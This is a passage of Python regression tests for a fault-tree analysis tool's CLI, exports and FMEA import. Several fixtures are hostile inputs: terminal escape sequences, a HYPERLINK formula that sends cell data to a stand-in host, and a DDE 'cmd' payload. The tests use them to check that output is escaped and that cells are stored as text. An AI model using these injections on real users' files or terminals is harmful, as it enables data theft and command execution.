"""Regression tests for the 2026-10 review of import/export, the CLI, the
DOCX report, the Excel export and the FMEA import (finding prefix IO-).

Each test failed before its fix.
"""
import csv
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from fta_web import cli

REPO = Path(__file__).resolve().parents[2]
RUN = REPO / "fta_web" / "run.py"


def write_doc(path, tree=None, title="Doc", mode="FTA", **extra):
    doc = {"title": title, "date": "2026-01-01", "mode": mode, "tree": tree or {
        "id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
            {"id": "a", "name": "Pump ü", "probability": 0.01, "children": []},
            {"id": "b", "name": "Valve", "probability": 0.02, "children": []},
        ]}}
    doc.update(extra)
    path.write_text(json.dumps(doc), encoding="utf-8")
    return path


def run_cli(*args, encoding):
    """The real entry point with stdout in ``encoding`` (not UTF-8 mode)."""
    env = dict(os.environ, PYTHONIOENCODING=encoding)
    env.pop("PYTHONUTF8", None)
    proc = subprocess.run([sys.executable, str(RUN)] + [str(a) for a in args],
                          capture_output=True, cwd=str(REPO), env=env, timeout=120)
    return proc.returncode, proc.stdout, proc.stderr.decode("utf-8", "replace")


# ---- IO-1: a console that cannot encode a character ----------------------------------


@pytest.mark.parametrize("encoding", ["ascii", "cp932"])
def test_cli_survives_a_console_that_cannot_encode_the_output(tmp_path, encoding):
    """'ü' (not in cp932) or the '—' of an empty cell crashed the write with
    UnicodeEncodeError: a traceback and exit 1 for a run that succeeded."""
    doc = write_doc(tmp_path / "t.json")
    code, out, err = run_cli("quantify", doc, encoding=encoding)
    assert code == 0, err
    assert "Traceback" not in err and b"Pump" in out

    code, out, err = run_cli("quantify", doc, "--json", encoding=encoding)
    assert code == 0, err
    # Still valid JSON, and lossless: non-ASCII is escaped, not replaced.
    payload = json.loads(out.decode("ascii"))
    assert payload["results"]["events"][0]["name"] == "Pump ü"


def test_cli_exit_code_3_survives_a_non_ascii_file_name(tmp_path):
    """The documented 'unreadable file' code was lost to the crash (exit 1)."""
    code, _out, err = run_cli("validate", tmp_path / "nö.json", encoding="ascii")
    assert code == 3, err
    assert "Traceback" not in err


# ---- IO-2: --json is strict JSON ------------------------------------------------------


def _strict_json(text):
    def refuse(token):
        raise ValueError("non-standard JSON token %s" % token)

    return json.loads(text, parse_constant=refuse)


def test_cli_json_has_no_nan_tokens(tmp_path, capsys):
    """A probability of NaN (Python's json reads the bare literal) reached the
    summary and was printed as ``NaN``, which JSON.parse, jq and every strict
    parser reject. It is null now, as in the API's responses."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "A", "probability": float("nan"), "children": []},
        {"id": "b", "name": "B", "probability": 0.1, "children": []}]}
    doc = write_doc(tmp_path / "nan.json", tree)
    assert cli.main(["quantify", str(doc), "--json"]) == 0
    payload = _strict_json(capsys.readouterr().out)
    assert payload["results"]["summary"]["treeWalk"] is None

    out = tmp_path / "res.json"
    assert cli.main(["quantify", str(doc), "--json", "--out", str(out)]) == 0
    _strict_json(out.read_text(encoding="utf-8"))


# ---- IO-3: --top applies to --json --------------------------------------------------------


def test_cutsets_top_applies_to_json(tmp_path, capsys):
    """``--top N`` cut the text and CSV tables (and importance's JSON) but
    ``cutsets --json`` still listed every cut set."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "e%d" % i, "name": "E%d" % i, "probability": 0.001 * (i + 1), "children": []}
        for i in range(5)]}
    doc = write_doc(tmp_path / "five.json", tree)
    assert cli.main(["cutsets", str(doc), "--top", "2", "--json"]) == 0
    results = json.loads(capsys.readouterr().out)["results"]
    assert [c["rank"] for c in results["cutSets"]] == [1, 2]
    assert results["cutSets"][0]["events"][0]["id"] == "e4"  # the most probable
    assert results["total"] == 5  # the totals still describe the whole list
    assert cli.main(["cutsets", str(doc), "--top", "2", "--csv"]) == 0
    assert len(list(csv.DictReader(io.StringIO(capsys.readouterr().out)))) == 2


# ---- IO-4: an output that cannot be written -------------------------------------------


def test_unwritable_out_is_an_error_message_not_a_traceback(tmp_path, capsys):
    """``--out`` under a regular file (or any OSError while writing) escaped
    main() as FileExistsError / NotADirectoryError with a traceback."""
    doc = write_doc(tmp_path / "t.json")
    blocker = tmp_path / "taken.txt"
    blocker.write_text("not a folder", encoding="utf-8")
    assert cli.main(["quantify", str(doc), "--json", "--out", str(blocker / "r.json")]) == 1
    err = capsys.readouterr().err
    assert "cannot write" in err and "r.json" in err


def test_report_that_cannot_be_written_fails_that_file_only(tmp_path, capsys):
    pytest.importorskip("docx")
    good = write_doc(tmp_path / "good.json")
    blocker = tmp_path / "taken.txt"
    blocker.write_text("not a folder", encoding="utf-8")
    # A non-.docx --out is a folder; here it names an existing file.
    code = cli.main(["report", str(good), "--out", str(blocker), "--sections", "metadata",
                     "--json"])
    assert code == 1
    captured = capsys.readouterr()
    assert "cannot write" in captured.err
    assert "cannot write" in json.loads(captured.out)["error"]


def test_out_never_overwrites_an_input_file(tmp_path, capsys):
    """``quantify plant.json --json --out plant.json`` replaced the analysis
    with the results, silently (exit 0): the tree was gone."""
    doc = write_doc(tmp_path / "plant.json")
    before = doc.read_bytes()
    assert cli.main(["quantify", str(doc), "--json", "--out", str(doc)]) == 2
    assert "input" in capsys.readouterr().err
    assert doc.read_bytes() == before
    # the same file under another spelling
    other = tmp_path / "x" / ".." / "plant.json"
    assert cli.main(["validate", str(doc), "--out", str(other)]) == 2
    assert doc.read_bytes() == before


def test_report_uncertainty_flag_adds_the_section_to_explicit_sections(tmp_path, monkeypatch):
    """``--uncertainty`` is documented as 'run Monte Carlo and include it',
    but with ``--sections`` given it was silently dropped."""
    pytest.importorskip("docx")
    from fta_web import report_docx

    seen = {}
    real = report_docx.collect_report_data

    def spy(core, warnings=None, options=None):
        seen.update(sections=list(options["sections"]), run=options["runUncertainty"])
        return real(core, warnings, options)

    monkeypatch.setattr(report_docx, "collect_report_data", spy)
    doc = write_doc(tmp_path / "t.json")
    assert cli.main(["report", str(doc), "--sections", "metadata,headline", "--uncertainty",
                     "--n", "200", "--out", str(tmp_path / "r.docx")]) == 0
    assert seen == {"sections": ["metadata", "headline", "uncertainty"], "run": True}


def _same_stem_inputs(tmp_path):
    paths = []
    for sub, p in (("a", 0.1), ("b", 0.2)):
        (tmp_path / sub).mkdir()
        tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
            {"id": "x", "name": "X", "probability": p, "children": []}]}
        paths.append(write_doc(tmp_path / sub / "plant.json", tree, title="Plant " + sub))
    return paths


@pytest.mark.parametrize("command, extra", [
    ("quantify", ["--json"]), ("validate", ["--csv"]), ("cutsets", []),
])
def test_two_inputs_writing_one_output_file_are_refused(tmp_path, capsys, command, extra):
    """a/plant.json and b/plant.json with --out dir/ both became
    dir/plant.<command>.<ext>: one result silently overwritten, exit 0."""
    a, b = _same_stem_inputs(tmp_path)
    out = tmp_path / "results"
    assert cli.main([command, str(a), str(b), "--out", str(out) + os.sep] + extra) == 2
    err = capsys.readouterr().err
    assert str(a) in err and str(b) in err
    assert not out.exists()  # refused before anything was written


def test_two_reports_into_one_file_are_refused(tmp_path, capsys):
    pytest.importorskip("docx")
    a, b = _same_stem_inputs(tmp_path)
    out = tmp_path / "reports"
    assert cli.main(["report", str(a), str(b), "--out", str(out), "--sections", "metadata"]) == 2
    assert str(a) in capsys.readouterr().err and not out.exists()
    # Beside each input (no --out) they do not collide.
    assert cli.main(["report", str(a), str(b), "--sections", "metadata"]) == 0
    assert (a.parent / "plant_report.docx").is_file() and (b.parent / "plant_report.docx").is_file()


def test_the_same_input_twice_is_not_a_collision(tmp_path):
    a, _b = _same_stem_inputs(tmp_path)
    out = tmp_path / "results"
    assert cli.main(["quantify", str(a), str(a), "--json", "--out", str(out) + os.sep]) == 0
    assert (out / "plant.quantify.json").is_file()


def test_a_per_input_output_never_overwrites_another_input(tmp_path, capsys):
    """IO-11 covered a single --out file; a per-input target can also be an input."""
    (tmp_path / "res").mkdir()
    victim = write_doc(tmp_path / "res" / "plant.quantify.json", title="Victim")
    before = victim.read_bytes()
    plant = write_doc(tmp_path / "plant.json")
    assert cli.main(["quantify", str(victim), str(plant), "--json",
                     "--out", str(tmp_path / "res")]) == 2
    assert "input" in capsys.readouterr().err
    assert victim.read_bytes() == before


# ---- IO-19: terminal control sequences from a file -------------------------------------


def test_text_output_does_not_pass_escape_sequences_to_the_terminal(tmp_path, capsys):
    """A name from a crafted file reached the terminal raw: ESC]0;…BEL sets
    the window title, ESC[2J clears the screen (and can fake output)."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "A\x1b]0;pwned\x07\x1b[2J", "probability": 0.1, "children": []}]}
    doc = write_doc(tmp_path / "esc.json", tree, title="T\x1b[31m")
    assert cli.main(["quantify", str(doc)]) == 0
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out
    assert "A\\x1b]0;pwned\\x07\\x1b[2J" in out and "T\\x1b[31m" in out
    # Machine-readable output keeps the data exactly.
    assert cli.main(["quantify", str(doc), "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["results"]["events"][0]["name"] == tree[
        "children"][0]["name"]


# ---- IO-8: characters XML cannot hold (xlsx, xml, docx) ---------------------------------


def control_char_tree():
    """Text a user can really produce: PowerPoint's soft line break (\\x0b)
    pasted into notes or evidence, a Word cell mark (\\x07), a hand-edited
    or third-party file with \\x01 in a name."""
    return {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "Pump\x01A", "probability": 0.1, "notes": "Seal\x0bcheck",
         "children": [], "trace": {"evidence": "TR-1\x07", "owner": "Ann\x0bLee"},
         "quant": {"model": "fixed", "source": "OREDA\x00"}},
        {"id": "b", "name": "Valve", "probability": 0.2, "children": [],
         "links": [{"target_id": "a", "relation": "OR"}]},
    ]}


def control_char_core(title="Plant\x03"):
    from fta_web.engine import WebCore

    core = WebCore()
    core.set_data(control_char_tree())
    core.set_metadata(title=title, date="2026-01-01", mode="FTA")
    core.recalculate_probabilities()
    return core


def test_xml_text_drops_what_xml_cannot_hold():
    from fta_web.excel_events import xml_text

    assert xml_text("a\x01b\x00c\ud800d\ufffe") == "abcd"
    # whitespace-like controls become a space, as sanitize_name makes them
    assert xml_text("Seal\x0bcheck\x0cnow\x1fx") == "Seal check now x"
    assert xml_text("tab\tnl\ncr\r é λ 日本") == "tab\tnl\ncr\r é λ 日本"
    assert xml_text(None) == "" and xml_text(12) == "12"


def test_xlsx_export_survives_control_characters(tmp_path):
    """The core's FTA sheet raised IllegalCharacterError (500); the Events
    sheet's failure was even reported as 'openpyxl is not installed' (503)."""
    openpyxl = pytest.importorskip("openpyxl")
    from fta_web.excel_events import EVENT_HEADERS, export_xlsx

    core = control_char_core()
    path = tmp_path / "x.xlsx"
    ok, error = export_xlsx(core, str(path))
    assert ok, error
    wb = openpyxl.load_workbook(path)
    fta = [c.value for row in wb["FTA"].iter_rows() for c in row if c.value]
    assert any(v.startswith("PumpA\n") and "Notes: Seal check" in v for v in fta)
    events = wb["Events"]
    col = {h: i + 1 for i, h in enumerate(EVENT_HEADERS)}
    assert events.cell(row=3, column=col["Name"]).value == "PumpA"
    assert events.cell(row=3, column=col["Evidence"]).value == "TR-1"
    assert events.cell(row=3, column=col["Owner"]).value == "Ann Lee"
    assert events.cell(row=3, column=col["Source"]).value == "OREDA"
    analysis = {r[0].value: r[1].value for r in wb["Analysis"].iter_rows(min_row=2)}
    assert analysis["Title"] == "Plant"
    # The export reads the document; it never edits it.
    assert core.find_node_by_id("a")["name"] == "Pump\x01A"
    assert core.find_node_by_id("a")["notes"] == "Seal\x0bcheck"


@pytest.fixture
def files_client(tmp_path):
    import flask

    from fta_web.routes.files import files_bp
    from fta_web.routes.report import report_bp
    from fta_web.routes.tree import tree_bp
    from fta_web.state import get_state, reset_state

    reset_state()
    app = flask.Flask(__name__)
    for bp in (tree_bp, files_bp, report_bp):
        app.register_blueprint(bp)
    get_state().fs_root = tmp_path
    with app.test_client() as client:
        yield client


def open_doc(client, path):
    response = client.post("/api/file/open", json={"path": str(path)})
    assert response.status_code == 200, response.get_data(as_text=True)


def test_xml_export_is_well_formed_with_control_characters(files_client, tmp_path):
    """ElementTree wrote the raw \\x01 / \\x0b into the file: a 200 download
    that no XML parser accepts ('not well-formed (invalid token)')."""
    import xml.etree.ElementTree as ET

    open_doc(files_client, write_doc(tmp_path / "c.json", control_char_tree()))
    response = files_client.get("/api/export/xml")
    assert response.status_code == 200
    root = ET.fromstring(response.get_data())
    pump = root.find("Node").find("Node")
    assert pump.get("name") == "PumpA"
    assert pump.find("Notes").text == "Seal check"
    link = root.find("Node").findall("Node")[1].find("Links").find("Link")
    assert link.text == "PumpA"


def test_xml_export_of_non_string_type_and_notes(files_client, tmp_path):
    """A hand-edited ``"type": 5`` / ``"notes": 5`` made ElementTree raise
    'cannot serialize 5' (500)."""
    import xml.etree.ElementTree as ET

    tree = {"id": "root", "name": "Top", "type": None, "logicGate": "OR", "children": [
        {"id": "a", "name": "A", "type": 5, "notes": 7, "probability": 0.1, "children": []}]}
    open_doc(files_client, write_doc(tmp_path / "t.json", tree))
    response = files_client.get("/api/export/xml")
    assert response.status_code == 200, response.get_data(as_text=True)
    node = ET.fromstring(response.get_data()).find("Node").find("Node")
    assert node.get("type") == "5" and node.find("Notes").text == "7"


def test_export_view_leaves_an_ordinary_document_byte_identical(tmp_path):
    from fta_web.engine import WebCore
    from fta_web.excel_events import export_view

    core = WebCore()
    ok, error = core.load_from_json(str(REPO / "fta_web" / "examples" / "sampleFTA.json"))
    assert ok, error
    core.find_node_by_id("root")["notes"] = "Ünïcode <&> \"quotes\"\nline 2\ttab"
    plain, viewed = tmp_path / "plain.xml", tmp_path / "view.xml"
    assert core.export_to_xml(str(plain))[0] and export_view(core).export_to_xml(str(viewed))[0]
    assert plain.read_bytes() == viewed.read_bytes()


def docx_text(blob):
    docx = pytest.importorskip("docx")
    document = docx.Document(io.BytesIO(blob))
    parts = [p.text for p in document.paragraphs]
    for table in document.tables:
        parts.extend(cell.text for row in table.rows for cell in row.cells)
    return "\n".join(parts)


def test_docx_report_survives_control_characters():
    """python-docx raised 'All strings must be XML compatible' on the first
    such character in any name, trace field, source or the title: the
    report route answered 500 and the CLI printed a traceback."""
    pytest.importorskip("docx")
    from fta_web import report_docx

    core = control_char_core()
    core.find_node_by_id("b")["name"] = "Valve\ud800"  # a lone surrogate from a broken file
    options = {"sections": list(report_docx.SECTIONS)}
    data = report_docx.collect_report_data(core, [], options)
    text = docx_text(report_docx.build_report(data, options))
    assert "Plant" in text and "PumpA" in text and "TR-1" in text and "Ann Lee" in text
    assert "OREDA" in text and "Valve" in text


def test_docx_report_with_a_numeric_title(files_client, tmp_path):
    """``"title": 123`` in a file: build_report's heading raised TypeError and
    the route's download name did ``123 + "_report"`` (500)."""
    pytest.importorskip("docx")
    doc = write_doc(tmp_path / "n.json", title=123)
    upload = {"file": (io.BytesIO(doc.read_bytes()), "n.json")}
    assert files_client.post("/api/import/json", data=upload,
                             content_type="multipart/form-data").status_code == 200
    response = files_client.post("/api/report/docx", json={"sections": ["metadata"]})
    assert response.status_code == 200, response.get_data(as_text=True)
    assert "123_report.docx" in response.headers["Content-Disposition"]
    assert "123" in docx_text(response.get_data())


def test_xlsx_export_writes_text_never_formulas(tmp_path):
    """openpyxl stores any string that starts with '=' as a formula: a node
    named '=HYPERLINK(...)' (from a supplier's tree or FMEA sheet) became a
    live link in the Events sheet, '=1+1' showed as 2, and the core's FTA
    cell ('=...' + '\\n(Type: ...)') was a broken formula Excel 'repairs'."""
    openpyxl = pytest.importorskip("openpyxl")
    from fta_web.engine import WebCore
    from fta_web.excel_events import EVENT_HEADERS, export_xlsx

    evil = '=HYPERLINK("http://example.invalid/?x="&A2,"Click")'
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": evil, "probability": 0.1, "children": [],
         "trace": {"requirementId": "=1+1", "tags": ["=2+2"]},
         "fmea": {"id": "=F1", "cause": "=cmd|' /C calc'!A0"}},
        {"id": "b", "name": "Valve", "probability": 0.2, "children": []}]}
    core = WebCore()
    core.set_data(tree)
    core.set_metadata(title="=SUM(1,2)", date="2026-01-01", mode="FTA")
    core.recalculate_probabilities()
    path = tmp_path / "f.xlsx"
    ok, error = export_xlsx(core, str(path))
    assert ok, error
    wb = openpyxl.load_workbook(path)
    for ws in wb.worksheets:
        formulas = [c.coordinate for row in ws.iter_rows() for c in row if c.data_type == "f"]
        assert formulas == [], (ws.title, formulas)
    events = wb["Events"]
    col = {h: i + 1 for i, h in enumerate(EVENT_HEADERS)}
    assert events.cell(row=3, column=col["Name"]).value == evil
    assert events.cell(row=3, column=col["Requirement ID"]).value == "=1+1"
    assert events.cell(row=3, column=col["FMEA cause"]).value == "=cmd|' /C calc'!A0"
    fta_cells = [c.value for row in wb["FTA"].iter_rows() for c in row if c.value]
    assert any(v.startswith(evil + "\n(") for v in fta_cells)
    analysis = {r[0].value: r[1].value for r in wb["Analysis"].iter_rows(min_row=2)}
    assert analysis["Title"] == "=SUM(1,2)"


def test_xlsx_sheet_failure_is_not_reported_as_missing_openpyxl(files_client, tmp_path,
                                                                 monkeypatch):
    """Every failure while adding the Events/Analysis sheets carried
    '(openpyxl)' in its message, which the route reads as 'openpyxl broke
    on use': a full disk was answered 503 'Excel export needs the openpyxl
    package, which is not installed'."""
    pytest.importorskip("openpyxl")
    from fta_web import excel_events

    def disk_full(*_args, **_kwargs):
        raise OSError(28, "No space left on device")

    open_doc(files_client, write_doc(tmp_path / "d.json"))
    monkeypatch.setattr(excel_events, "_write_events", disk_full)
    response = files_client.get("/api/export/xlsx")
    error = response.get_json()["error"]
    assert response.status_code == 500, error
    assert "No space left on device" in error["message"]
    assert "not installed" not in error["message"]


FMEA_TEXT = "ID,Item,Failure Mode,Rate\nF-1,Pumpe,Défaut d'étanchéité,1e-6\nF-2,弁,固着,2e-6\n"
FMEA_ROWS = [["F-1", "Pumpe", "Défaut d'étanchéité", "1e-6"], ["F-2", "弁", "固着", "2e-6"]]


@pytest.mark.parametrize("encoding, bom, delimiter", [
    ("utf-16", b"", ","),             # Python's utf-16 writes the LE BOM
    ("utf-16", b"", "\t"),            # Excel's "Unicode Text"
    ("utf-16-be", b"\xfe\xff", ","),
])
def test_fmea_csv_in_utf16(tmp_path, encoding, bom, delimiter):
    """A UTF-16 file (BOM) fell through to latin-1: headers like 'ÿþI\\x00D\\x00',
    NULs in every value, and for tab-separated text a single column."""
    from fta_web import fmea_import

    path = tmp_path / "u16.csv"
    path.write_bytes(bom + FMEA_TEXT.replace(",", delimiter).encode(encoding))
    table = fmea_import.read_table(path)
    assert table["columns"] == ["ID", "Item", "Failure Mode", "Rate"]
    assert table["rows"] == FMEA_ROWS


@pytest.mark.parametrize("text, expected", [
    ("1.200,5", 1200.5),          # was 1.2005
    ("1.234.567,8", 1234567.8),   # was rejected
    ("-12.345,25", -12345.25),
    ("1.200,5e-3", 1.2005),
    # unchanged
    ("1,200.5", 1200.5), ("1,5", 1.5), ("1.5", 1.5), ("2,0e-6", 2e-6), ("1e-6", 1e-6),
    ("1 000", 1000.0), ("1.2e-6,", 1.2e-6),
])
def test_fmea_number_with_european_grouping(text, expected):
    from fta_web import fmea_import

    assert fmea_import._number(text) == pytest.approx(expected, rel=1e-15)


def test_fmea_lambda_with_european_grouping_is_not_divided_by_1000(tmp_path):
    """A FIT column formatted '#.##0,0' in a European Excel: 1.200,5 FIT was
    imported as 1.2005 FIT -- a failure rate 1000 times too low, silently."""
    from fta_web import fmea_import

    path = tmp_path / "eu.csv"
    path.write_text("ID;Mode;Lambda (FIT)\nA;Leak;1.200,5\n", encoding="utf-8")
    table = fmea_import.read_table(path)
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0,
            "logicGate": "OR", "notes": "", "links": [], "children": []}
    result = fmea_import.apply_import(
        tree, table["rows"], {"id": "ID", "mode": "Mode", "lambda": "Lambda (FIT)"}, "root",
        {}, "eu.csv", lambda_unit="FIT", columns=table["columns"])
    assert result["created"] == ["root_0"]
    assert tree["children"][0]["quant"]["lambda"] == pytest.approx(1.2005e-6, rel=1e-12)


@pytest.mark.parametrize("text, rows", [
    # trailing delimiter on the data rows only (several exporters do this)
    ("ID;Item;Rate\nA;Pump;1,5e-6;\nB;Valve;2e-6;\n",
     [["A", "Pump", "1,5e-6"], ["B", "Valve", "2e-6"]]),
    # ragged rows: trailing empty fields left out
    ("ID;Item;Mode;Cause;Rate\nA;Pump;Leak;;1e-6\nB;Valve;Stuck\nC;Fan;Noise;Wear;3e-6\n",
     [["A", "Pump", "Leak", None, "1e-6"], ["B", "Valve", "Stuck", None, None],
      ["C", "Fan", "Noise", "Wear", "3e-6"]]),
])
def test_fmea_semicolon_csv_that_defeats_the_sniffer(tmp_path, text, rows):
    """csv.Sniffer wants the same delimiter count on ~90 % of the lines; on a
    short or ragged file it gives up, and the comma fallback made every line
    one column ('ID;Item;Rate'), or split '1,5e-6' in two: nothing could be
    mapped."""
    from fta_web import fmea_import

    path = tmp_path / "semi.csv"
    path.write_text(text, encoding="utf-8")
    table = fmea_import.read_table(path)
    assert table["columns"] == text.splitlines()[0].split(";")
    assert table["rows"] == rows


@pytest.mark.parametrize("text, expected", [
    ("1,200", 1200.0), ("12,345.6", 12345.6), ("-1,200", -1200.0), ("+1,234,567", 1234567.0),
    (" 1,200 ", 1200.0), ("1,234,567.25", 1234567.25),
    # not the grouping shape: today's decimal-comma reading
    ("1,5", 1.5), ("0,001", 0.001), ("0,500", 0.5), ("1,20", 1.2), ("1,2345", 1.2345),
    ("1,200e-3", 1.2e-3), ("1.200,5", 1200.5),
])
def test_fmea_comma_grouping_in_a_comma_delimited_csv(text, expected):
    from fta_web import fmea_import

    assert fmea_import._number(text, comma_groups=True) == pytest.approx(expected, rel=1e-15)


def test_fmea_comma_grouping_only_where_the_comma_cannot_be_decimal():
    from fta_web import fmea_import

    assert fmea_import._number("1,200") == pytest.approx(1.2)  # ';'/tab CSV, xlsx text


def _import_csv(tmp_path, text, mapping, **kw):
    from fta_web import fmea_import

    path = tmp_path / "in.csv"
    path.write_bytes(text.encode("utf-8"))
    table = fmea_import.read_table(path)
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0,
            "logicGate": "OR", "notes": "", "links": [], "children": []}
    result = fmea_import.apply_import(tree, table["rows"], mapping, "root", {}, "in.csv",
                                      columns=table["columns"], row_numbers=table["rowNumbers"],
                                      delimiter=table["delimiter"], **kw)
    return table, tree, result


def test_fmea_quoted_thousands_in_a_comma_csv_are_not_a_decimal_comma(tmp_path):
    """Excel writes a '#,##0' FIT column to a comma CSV as "1,200": it was
    read as 1.2 FIT (λ 1000 times too low, silently) and an RPN "1,000"
    as 1."""
    table, tree, _ = _import_csv(
        tmp_path, 'ID,Mode,Lambda (FIT),RPN\nA,Leak,"1,200","1,000"\nB,Stuck,"0,5",10\n',
        {"id": "ID", "mode": "Mode", "lambda": "Lambda (FIT)", "rpn": "RPN"}, lambda_unit="FIT")
    assert table["delimiter"] == ","
    a, b = tree["children"]
    assert a["quant"]["lambda"] == pytest.approx(1.2e-6, rel=1e-12)
    assert a["fmea"]["rpn"] == 1000
    assert b["quant"]["lambda"] == pytest.approx(0.5e-9, rel=1e-12)  # not a group: decimal


def test_fmea_semicolon_csv_keeps_the_decimal_comma(tmp_path):
    table, tree, _ = _import_csv(tmp_path, "ID;Mode;Lambda (FIT)\nA;Leak;1,200\n",
                                 {"id": "ID", "mode": "Mode", "lambda": "Lambda (FIT)"},
                                 lambda_unit="FIT")
    assert table["delimiter"] == ";"
    assert tree["children"][0]["quant"]["lambda"] == pytest.approx(1.2e-9, rel=1e-12)


def test_fmea_import_route_reads_comma_groups_of_a_comma_csv(tmp_path):
    import flask

    from fta_web.routes.fmea import fmea_bp
    from fta_web.routes.tree import tree_bp
    from fta_web.state import get_state, reset_state

    (tmp_path / "f.csv").write_text('ID,Mode,Lambda\nA,Leak,"1,200"\n', encoding="utf-8")
    reset_state()
    app = flask.Flask(__name__)
    app.register_blueprint(tree_bp)
    app.register_blueprint(fmea_bp)
    get_state().fs_root = tmp_path
    with app.test_client() as client:
        response = client.post("/api/fmea/import", json={
            "path": "f.csv", "mapping": {"id": "ID", "mode": "Mode", "lambda": "Lambda"},
            "lambdaUnit": "FIT", "parentId": "root"})
        assert response.status_code == 200, response.get_data(as_text=True)
    node = get_state().core.find_node_by_id("root_0")
    assert node["quant"]["lambda"] == pytest.approx(1.2e-6, rel=1e-12)


GROUPED_FMEA = [
    ["Item", "Failure Mode", "Cause", "Occurrence"],
    ["Pump", "Leak", "Seal wear", 4],
    [None, "Stuck", "Corrosion", 5],
    [None, None, "Ice", None],          # another cause of the row above: no mode
    [None, "Noise", "Bearing", 3],
    ["Valve", "Leak", "Seat", 3],
    [None, "Stuck", "Dirt", 6],
]
GROUPED_NAMES = ["Pump – Leak", "Pump – Stuck", "Pump – Noise", "Valve – Leak", "Valve – Stuck"]


def _grouped_csv(tmp_path):
    lines = [",".join("" if v is None else str(v) for v in row) for row in GROUPED_FMEA]
    path = tmp_path / "grouped.csv"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def _grouped_xlsx_merged(tmp_path):
    openpyxl = pytest.importorskip("openpyxl")
    book = openpyxl.Workbook()
    for row in GROUPED_FMEA:
        book.active.append(row)
    book.active.merge_cells("A2:A5")   # the item written once over its modes
    book.active.merge_cells("A6:A7")
    path = tmp_path / "grouped.xlsx"
    book.save(path)
    return path


@pytest.mark.parametrize("make", [_grouped_csv, _grouped_xlsx_merged])
def test_fmea_item_written_once_per_group_is_filled_down(tmp_path, make):
    """The usual FMEA layout writes the item once over its failure modes
    (merged, or blank below). Those rows lost their item -- and without an
    ID column 'Valve / Stuck' became 'Stuck', a 'duplicate' of 'Pump /
    Stuck', and was skipped."""
    from fta_web import fmea_import

    table = fmea_import.read_table(make(tmp_path))
    mapping = fmea_import.suggest_mapping(table["columns"])
    assert mapping["item"] == "Item" and "id" not in mapping
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": []}
    result = fmea_import.apply_import(tree, table["rows"], mapping, "root", {}, "g",
                                      columns=table["columns"], row_numbers=table["rowNumbers"],
                                      delimiter=table["delimiter"])
    assert [n["name"] for n in tree["children"]] == GROUPED_NAMES
    assert [n["fmea"]["id"] for n in tree["children"]][4] == "Valve / Stuck"
    assert tree["children"][1]["fmea"]["item"] == "Pump"
    # Only the cause-only row (no item, no mode) is skipped, as before.
    assert [(s["row"], s["reason"]) for s in result["skipped"]] == [(4, "noKey")]


def test_fmea_fill_down_with_an_id_column_and_a_blank_first_item(tmp_path):
    from fta_web import fmea_import

    path = tmp_path / "ids.csv"
    path.write_text("ID,Item,Mode\nF-0,,Drift\nF-1,Pump,Leak\nF-2,,Stuck\n", encoding="utf-8")
    table = fmea_import.read_table(path)
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": []}
    fmea_import.apply_import(tree, table["rows"], {"id": "ID", "item": "Item", "mode": "Mode"},
                             "root", {}, "ids.csv", columns=table["columns"])
    assert [n["name"] for n in tree["children"]] == ["Drift", "Pump – Leak", "Pump – Stuck"]


def test_fmea_preview_shows_the_filled_item(tmp_path):
    import flask

    from fta_web.routes.fmea import fmea_bp
    from fta_web.routes.tree import tree_bp
    from fta_web.state import get_state, reset_state

    _grouped_csv(tmp_path)
    reset_state()
    app = flask.Flask(__name__)
    app.register_blueprint(tree_bp)
    app.register_blueprint(fmea_bp)
    get_state().fs_root = tmp_path
    with app.test_client() as client:
        payload = client.post("/api/fmea/preview", json={"path": "grouped.csv"}).get_json()
    assert [row[0] for row in payload["rows"]] == ["Pump", "Pump", None, "Pump", "Valve", "Valve"]


FULL_COLUMNS = ["ID", "Item", "Mode", "Cause", "S", "O", "D", "Rate"]
FULL_MAPPING = {"id": "ID", "item": "Item", "mode": "Mode", "cause": "Cause",
                "severity": "S", "occurrence": "O", "detection": "D", "lambda": "Rate"}


def _reimport(tree, rows, mapping, source, columns=FULL_COLUMNS):
    from fta_web import fmea_import

    return fmea_import.apply_import(tree, rows, mapping, "root", {}, source, columns=columns)


def _imported_tree():
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": []}
    _reimport(tree, [["F-1", "Pump", "Leak", "Seal wear", 8, 3, 4, 1e-6],
                     ["F-2", "Valve", "Stuck", "Corrosion", 7, 5, 2, 2e-6],
                     ["F-3", "Fan", "Noise", "Bearing", 4, 4, 4, 3e-6]], FULL_MAPPING, "v1.csv")
    return tree


def test_fmea_reimport_updates_only_the_mapped_fields():
    """Refreshing only the failure rates (ID + λ mapped) wiped item, mode,
    cause, S/O/D and RPN from every fmea block and renamed the nodes to
    their IDs ('Pump – Leak' -> 'F-1')."""
    tree = _imported_tree()
    pump = tree["children"][0]
    result = _reimport(tree, [["F-1", 5e-6]], {"id": "ID", "lambda": "Rate"}, "rates.csv",
                       columns=["ID", "Rate"])
    assert result["updated"] == ["root_0"]
    assert pump["name"] == "Pump – Leak"
    assert pump["fmea"] == {"id": "F-1", "item": "Pump", "mode": "Leak", "cause": "Seal wear",
                            "severity": 8, "occurrence": 3, "detection": 4, "rpn": 96,
                            "source": "rates.csv"}
    assert pump["quant"]["lambda"] == 5e-6


def test_fmea_reimport_mapped_blank_clears_and_name_follows_mapped_columns():
    tree = _imported_tree()
    pump = tree["children"][0]
    # A mapped column left blank empties that field; the mode is re-derived
    # into the name with the node's kept item.
    _reimport(tree, [["F-1", "Leak (rev B)", None]], {"id": "ID", "mode": "Mode", "cause": "Cause"},
